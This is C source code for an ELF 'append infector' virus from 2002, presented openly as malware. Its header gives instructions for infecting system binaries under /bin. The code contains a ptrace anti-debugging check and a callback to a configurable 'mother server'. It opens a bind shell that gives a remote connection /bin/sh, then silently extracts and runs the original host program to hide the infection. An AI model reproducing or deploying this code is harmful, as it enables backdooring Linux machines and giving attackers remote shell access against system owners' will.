
/*
 -----------------------------------------------------------

 [Invader] - append ELF infect0r - version 2.1.1
             (C) BrainStorm & Resistor - 02-2002  
             now with anti debugging tekneeqs :>
 -----------------------------------------------------------
 
 Information :
 +++++++++++++
 This ELF Infector uses the appendage infection tekneeq!
 that means to two Executeables are appended together.

 It worx like that :

  _________________
 |                 | The Parasite Code is first, thats why
 | [PARASITE CODE] | it needs to know its own size.
 |_________________|
 |                 | the host code stays untouched and gets
 | [ORIGINAL CODE] | extracted and executed from the virus.
 |_________________|

 -----------------------------------------------------------

 to get it working :
 +++++++++++++++++++
'gcc code.c -O2 -o code', then get the file size and change
 the define in the code, now recompile and we are done ;)

 -----------------------------------------------------------

 to infect a binary :
 ++++++++++++++++++++
 cat /bin/binary >> para ; mv para /bin/binary
 you get the point ...

 -----------------------------------------------------------

 special thanks to :
 +++++++++++++++++++
 ghQst and SectorX for making me interested in ELF infection
 and for beeing there for me since back in the days =)  !

 shouts go out to all ElectronicSouls members - j00 r0ck =)

 -----------------------------------------------------------
  [ElectronicSouls] -  keep the spirit alive !
 -----------------------------------------------------------

KUNG FOO !

*/

#include <netdb.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <linux/user.h>

#define PARASIZE  15220        /* don't forget to change me! */
#define MAXDATA   100	       /* max data we can get at once */
#define BACKLOG   10           /* connections allowed on the incoming queue */
#define TEMP      ".para.tmp"  /* tmp file */
#define HANDSHAKE "-0x45-"     /* string to send out */
#define REMOTE    "127.0.0.1"  /* mother server ip */
#define PORT      "21227"      /* mother port */
// #define MSG_DONTWAIT 0x40 redefined?

struct  stat        s_stat;
struct  hostent     *stuff;
struct  sockaddr_in serv_addr, client;

typedef char        *STRING;

int main (int argc, char **argv, char **envp) 
{
  int cli, 
      soc, 
      input, 
      output, 
      length, 
      moo;

  int fd,  
      bytes, 
      sin_size, 
      len;

      STRING tempkey;

      char buf [MAXDATA];
      char *dope; 

      tempkey = (char *) malloc (sizeof (char) * 100);

      if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)  /* anti-debuggin routine  ;> */
      {
        printf("\n\n *** Debugging detected.. nice try bitch.. *** \n\n");
        return(1);
      }

      if(fork()==0)
      {

      if ((stuff = gethostbyname (REMOTE)) == NULL)     
      { 
        herror ("gethostbyname"); 
        exit(1);
      }

      if ((fd= socket (PF_INET, SOCK_STREAM, 0)) == -1) 
      {
        perror ("socket()"); 
        exit(1);  
      }

      client.sin_family = PF_INET;
      client.sin_port = htons (atoi (PORT));
      client.sin_addr = *((struct in_addr *) stuff->h_addr);

      memset (&(client.sin_zero), 8, '\0');	/* zero the rest of the struct */

      if (connect(fd, (struct sockaddr *) &client,sizeof (struct sockaddr_in)) == -1) 
      { 
        perror ("connect()"); 
        exit(1); 
      }

      tempkey = HANDSHAKE;
      len = strlen (tempkey);

      if ((moo = send (fd, tempkey, len, 0)) == -1)  
      { 
       perror ("send"); 
       exit(1); 
      }  
      if ((bytes = recv(fd, buf, MAXDATA-1, 0)) == -1) 
      { 
        perror("recv");
        exit(1);
      }

      buf[bytes] = '\0';
      send(fd,"-0x45-",14,0);

      if (strstr(tempkey, HANDSHAKE) != NULL) 
      {
      /* up to here authentication procedure is valid */
      /* so we execute the parasite payloa ;)      d  */ 
      serv_addr.sin_family = 2; 
      serv_addr.sin_addr.s_addr = 0;
      serv_addr.sin_port = (0x4553);

      soc = socket(2, 1, 6);

      bind(soc, (struct sockaddr *)&serv_addr, 0x10);
      listen(soc, 1);

      cli = accept(soc,0,0);

      dup2(cli, 0);
      dup2(cli, 2);
 
     execl("/bin/sh", "sh", 0);
    }
   }
  if ((input = open("/proc/self/exe", O_RDONLY)) < 0)
  { 
    perror("open()"); 
    exit(0); 
  }
  if (fstat(input, &s_stat) < 0)
  { 
    perror("fstat()");
    exit(0); 
  }
  length = s_stat.st_size - PARASIZE;
  if ((dope = malloc(length)) == NULL)  
  { 
    printf("argh!@#\n"); 
    exit(0); 
  }
  if (lseek(input, PARASIZE, SEEK_SET) != PARASIZE) 
  {  
    perror("lseek()");
    exit(0);
  }
  if (read(input, dope, length) != length)  
  {  
    perror("read()"); 
    exit(0);
  }
  close(input);
  if ((output = open(TEMP, O_RDWR | O_CREAT | O_TRUNC, s_stat.st_mode)) <0)  
  { 
    perror("open()");
    exit(0);
  }
  if (write(output, dope, length) != length)
  {
    perror("write()");
    exit(0);
  }
  close(output); 
  free(dope);
  exit(execve(TEMP, argv, envp));
}
